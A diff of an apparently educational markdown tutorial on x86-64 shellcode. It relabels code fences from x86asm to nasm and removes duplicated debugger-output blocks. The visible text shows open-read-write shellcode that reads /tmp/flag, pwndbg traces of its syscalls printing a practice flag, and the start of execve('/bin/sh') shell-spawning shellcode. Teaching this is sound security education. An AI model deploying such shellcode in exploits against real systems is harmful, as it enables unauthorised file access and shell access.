@@ -95,7 +95,7 @@ This code is not part of the actual shellcode but serves as a reference to expla
 
 In the shellcode example, `xor rsi, rsi` sets the `rsi` register to `0`, which corresponds to `O_RDONLY (0)`, indicating that the file should be opened in read-only mode.
 
-```x86asm
+```nasm
 push 0x67
 mov rax, 0x616c662f706d742f 
 push rax
@@ -138,7 +138,7 @@ We keep the same values for `rsi` and `rdx` as used in the read syscall, since w
 
 Finally, we set `rax` to 1, which is the syscall number for write.
 
-```x86asm
+```nasm
 mov rdi, 1        ; rdi = 1 ; fd = stdout
 mov rax, 0x1      ; rax = 1 ; syscall_write
 syscall           ; write(fd, buf, 0x30)
@@ -146,7 +146,7 @@ syscall           ; write(fd, buf, 0x30)
 
 Putting everything together, the complete orw shellcode would be:
 
-```x86asm
+```nasm
 ;Name: orw.S
 
 push 0x67
@@ -236,7 +236,7 @@ flag{this_is_open_read_write_shellcode!}
 
 First, open `orw` with gdb, set a breakpoint on `run_sh()`, and type `run`.
 
-```x86asm
+```nasm
 ...
  RSP  0x7fffffffd888 —▸ 0x55555555517c (main+14) ◂— mov eax, 0
  RIP  0x555555555119 (run_sh) ◂— push 0x67
@@ -256,7 +256,7 @@ Now we can see that our shellcode is pointed to by `RIP`. Let's examine how the 
 
 Set a breakpoint on `<run_sh+29>`.
 
-```x86asm
+```nasm
  ► 0x555555555136 <run_sh+29>    syscall  <SYS_open>
         file: 0x7fffffffd878 ◂— '/tmp/flag'
         oflag: 0
@@ -267,7 +267,7 @@ The pwndbg plugin interprets syscall arguments as shown in above. This confirms 
 
 After running the syscall with the `ni` command, we can see that the file descriptor (3) for /tmp/flag is stored in the rax register, as expected from the open syscall.
 
-```x86asm
+```nasm
 ─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 *RAX  3
 ...
@@ -283,7 +283,7 @@ After running the syscall with the `ni` command, we can see that the file descri
 
 Set a breakpoint on `run_sh+55` where the second syscall is located.
 
-```x86asm
+```nasm
  ► 0x555555555150 <run_sh+55>    syscall  <SYS_read>
         fd: 3 (/tmp/flag)
         buf: 0x7fffffffd848 ◂— 0
@@ -292,35 +292,14 @@ Set a breakpoint on `run_sh+55` where the second syscall is located.
 
 The read syscall reads 0x30 bytes of data from the newly allocated file descriptor (3) for /tmp/flag and stores it at memory address 0x7fffffffe2c8. If we type `x/s 0x7fffffffe2c8`,
 
-```x86asm
+```nasm
 pwndbg> x/s 0x7fffffffe2c8
 0x7fffffffe2c8: "flag{this_is_open_read_write_shellcode!}\n"
 ```
 
 #### 3. write(1, buf, 0x30)
 
-```x86asm
- ► 0x555555555160 <run_sh+71>    syscall  <SYS_write>
-        fd: 1 (/dev/pts/2)
-        buf: 0x7fffffffd848 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
-        n: 0x30
-```
-
-```asm
- ► 0x555555555160 <run_sh+71>    syscall  <SYS_write>
-        fd: 1 (/dev/pts/2)
-        buf: 0x7fffffffd848 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
-        n: 0x30
-```
-
 ```nasm
- ► 0x555555555160 <run_sh+71>    syscall  <SYS_write>
-        fd: 1 (/dev/pts/2)
-        buf: 0x7fffffffd848 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
-        n: 0x30
-```
-
-```assembly
  ► 0x555555555160 <run_sh+71>    syscall  <SYS_write>
         fd: 1 (/dev/pts/2)
         buf: 0x7fffffffd848 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
@@ -347,7 +326,7 @@ The `argv` parameter represents <u>arguments passed to the executable</u>, while
 
 Our goal is to create shellcode that executes execve("/bin/sh", null, null) to spawn a shell.
 
-```x86asm
+```nasm
 ;Name: execve.S
 
 mov rax, 0x68732f6e69622f ; hex representation of "/bin/sh"
@@ -396,7 +375,7 @@ int main() { run_sh(); }
 
 We can translate the shellcode into byte code (opcode).
 
-```x86asm
+```nasm
 ; File name: shellcode.asm
 section .text
 global _start
